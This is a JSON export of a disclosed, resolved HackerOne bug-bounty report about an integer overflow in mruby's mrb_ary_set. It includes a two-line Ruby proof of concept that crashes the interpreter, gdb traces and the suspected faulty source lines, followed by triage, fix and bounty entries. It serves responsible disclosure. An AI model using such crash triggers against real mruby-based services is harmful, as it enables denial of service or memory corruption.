{"id":192235,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTIyMzU=","url":"https://hackerone.com/reports/192235","title":"Integer Overflow in mrb_ary_set","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-12-18T16:31:25.215Z","submitted_at":"2016-12-18T16:31:25.215Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"tunz","url":"/tunz","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-01-12T03:09:35.290Z","bug_reporter_agreed_on_going_public_at":"2017-01-12T03:09:35.255Z","team_member_agreed_on_going_public_at":"2017-01-11T21:55:48.601Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nI found a crash in mruby. I frankly couldn't reproduce it in mruby-engine. I think it is because of memory limitation, but I'm not sure.\n\nHere is a PoC (when the size of MRB_INT is 32). \n\n```ruby\nary = Array.new(0)\nary[0x7fffffff] = 1\n```\n\n```\n$ gdb -q --args ./bin/mruby ./test.rb\nReading symbols from ./bin/mruby...done.\n(gdb) r\nStarting program: /home/tunz/working/mruby/mruby/bin/mruby ./test.rb\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x00000000004146a8 in ary_fill_with_nil (ptr=0x1357010, size=2147476218) at /home/tunz/working/mruby/mruby/src/array.c:104\n104         *ptr++ = nil;\n(gdb) list\n99      ary_fill_with_nil(mrb_value *ptr, mrb_int size)\n100     {\n101       mrb_value nil = mrb_nil_value();\n102\n103       while (size--) {\n104         *ptr++ = nil;\n105       }\n106     }\n107\n108     static void\n(gdb) x/i $pc\n=\u003e 0x4146a8 \u003cary_fill_with_nil+50\u003e:     mov    QWORD PTR [rcx],rax\n(gdb) i r rcx\nrcx            0x1357000        20279296\n(gdb) bt\n#0  0x00000000004146a8 in ary_fill_with_nil (ptr=0x1357010, size=2147476218) at /home/tunz/working/mruby/mruby/src/array.c:104\n#1  0x0000000000415ab1 in mrb_ary_set (mrb=0x12d2010, ary=..., n=2147483647, val=...)\n    at /home/tunz/working/mruby/mruby/src/array.c:564\n#2  0x0000000000416266 in mrb_ary_aset (mrb=0x12d2010, self=...) at /home/tunz/working/mruby/mruby/src/array.c:798\n#3  0x000000000043032c in mrb_vm_exec (mrb=0x12d2010, proc=0x12d5210, pc=0x133a020) at /home/tunz/working/mruby/mruby/src/vm.c:1171\n#4  0x000000000042e850 in mrb_vm_run (mrb=0x12d2010, proc=0x12d5210, self=..., stack_keep=0)\n    at /home/tunz/working/mruby/mruby/src/vm.c:772\n#5  0x00000000004367f6 in mrb_top_run (mrb=0x12d2010, proc=0x12d5210, self=..., stack_keep=0)\n    at /home/tunz/working/mruby/mruby/src/vm.c:2487\n#6  0x0000000000446ea4 in mrb_load_exec (mrb=0x12d2010, p=0x132e2c0, c=0x132cf30)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5755\n#7  0x0000000000446f3a in mrb_load_file_cxt (mrb=0x12d2010, f=0x132df00, c=0x132cf30)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5764\n#8  0x00000000004024f8 in main (argc=2, argv=0x7fff6f302128)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232\n```\n\nI think the root cause of this bug is the following line:\n```C\n 548 MRB_API void\n 549 mrb_ary_set(mrb_state *mrb, mrb_value ary, mrb_int n, mrb_value val)\n 550 {\n...\n 562     if (a-\u003eaux.capa \u003c= n)\n 563       ary_expand_capa(mrb, a, n + 1); // \u003c- n + 1 can be overflowed?\n 564     ary_fill_with_nil(a-\u003eptr + a-\u003elen, n + 1 - a-\u003elen);\n 565     a-\u003elen = n + 1;\n 566   }\n```","vulnerability_information_html":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eI found a crash in mruby. I frankly couldn\u0026#39;t reproduce it in mruby-engine. I think it is because of memory limitation, but I\u0026#39;m not sure.\u003c/p\u003e\n\n\u003cp\u003eHere is a PoC (when the size of MRB_INT is 32). \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003eary\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eArray\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003eary\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x7fffffff\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ gdb -q --args ./bin/mruby ./test.rb\nReading symbols from ./bin/mruby...done.\n(gdb) r\nStarting program: /home/tunz/working/mruby/mruby/bin/mruby ./test.rb\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x00000000004146a8 in ary_fill_with_nil (ptr=0x1357010, size=2147476218) at /home/tunz/working/mruby/mruby/src/array.c:104\n104         *ptr++ = nil;\n(gdb) list\n99      ary_fill_with_nil(mrb_value *ptr, mrb_int size)\n100     {\n101       mrb_value nil = mrb_nil_value();\n102\n103       while (size--) {\n104         *ptr++ = nil;\n105       }\n106     }\n107\n108     static void\n(gdb) x/i $pc\n=\u0026gt; 0x4146a8 \u0026lt;ary_fill_with_nil+50\u0026gt;:     mov    QWORD PTR [rcx],rax\n(gdb) i r rcx\nrcx            0x1357000        20279296\n(gdb) bt\n#0  0x00000000004146a8 in ary_fill_with_nil (ptr=0x1357010, size=2147476218) at /home/tunz/working/mruby/mruby/src/array.c:104\n#1  0x0000000000415ab1 in mrb_ary_set (mrb=0x12d2010, ary=..., n=2147483647, val=...)\n    at /home/tunz/working/mruby/mruby/src/array.c:564\n#2  0x0000000000416266 in mrb_ary_aset (mrb=0x12d2010, self=...) at /home/tunz/working/mruby/mruby/src/array.c:798\n#3  0x000000000043032c in mrb_vm_exec (mrb=0x12d2010, proc=0x12d5210, pc=0x133a020) at /home/tunz/working/mruby/mruby/src/vm.c:1171\n#4  0x000000000042e850 in mrb_vm_run (mrb=0x12d2010, proc=0x12d5210, self=..., stack_keep=0)\n    at /home/tunz/working/mruby/mruby/src/vm.c:772\n#5  0x00000000004367f6 in mrb_top_run (mrb=0x12d2010, proc=0x12d5210, self=..., stack_keep=0)\n    at /home/tunz/working/mruby/mruby/src/vm.c:2487\n#6  0x0000000000446ea4 in mrb_load_exec (mrb=0x12d2010, p=0x132e2c0, c=0x132cf30)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5755\n#7  0x0000000000446f3a in mrb_load_file_cxt (mrb=0x12d2010, f=0x132df00, c=0x132cf30)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5764\n#8  0x00000000004024f8 in main (argc=2, argv=0x7fff6f302128)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI think the root cause of this bug is the following line:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e 548 MRB_API void\n 549 mrb_ary_set(mrb_state *mrb, mrb_value ary, mrb_int n, mrb_value val)\n 550 {\n...\n 562     if (a-\u0026gt;aux.capa \u0026lt;= n)\n 563       ary_expand_capa(mrb, a, n + 1); // \u0026lt;- n + 1 can be overflowed?\n 564     ary_fill_with_nil(a-\u0026gt;ptr + a-\u0026gt;len, n + 1 - a-\u0026gt;len);\n 565     a-\u0026gt;len = n + 1;\n 566   }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-02-10T21:55:48.645Z","allow_singular_disclosure_after":-122453638.29035984,"singular_disclosure_allowed":true,"vote_count":3,"voters":["eveeez","japz","spetr0x"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1374561,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the issue, and opened an issue in the mruby repository: https://github.com/mruby/mruby/issues/3353","markdown_message":"\u003cp\u003eThank you for your report. We\u0026#39;ve reproduced the issue, and opened an issue in the mruby repository: \u003ca title=\"https://github.com/mruby/mruby/issues/3353\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F3353\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/issues/3353\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-19T18:24:20.825Z","updated_at":"2016-12-19T18:24:20.825Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1409323,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for your report. This issue has now been resolved upstream.\n\nOur next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.","markdown_message":"\u003cp\u003eThank you for your report. This issue has now been resolved upstream.\u003c/p\u003e\n\n\u003cp\u003eOur next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-09T19:18:27.966Z","updated_at":"2017-01-09T19:18:27.966Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"tunz","url":"/tunz"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1414747,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for submitting this report!","markdown_message":"\u003cp\u003eThanks for submitting this report!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-11T21:55:43.825Z","updated_at":"2017-01-11T21:55:43.825Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"100.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"tunz","url":"/tunz"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1414748,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-01-11T21:55:48.619Z","updated_at":"2017-01-11T21:55:48.619Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1415213,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-01-12T03:09:35.270Z","updated_at":"2017-01-12T03:09:35.270Z","actor":{"username":"tunz","cleared":false,"url":"/tunz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1415214,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-01-12T03:09:35.305Z","updated_at":"2017-01-12T03:09:35.305Z","actor":{"username":"tunz","cleared":false,"url":"/tunz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}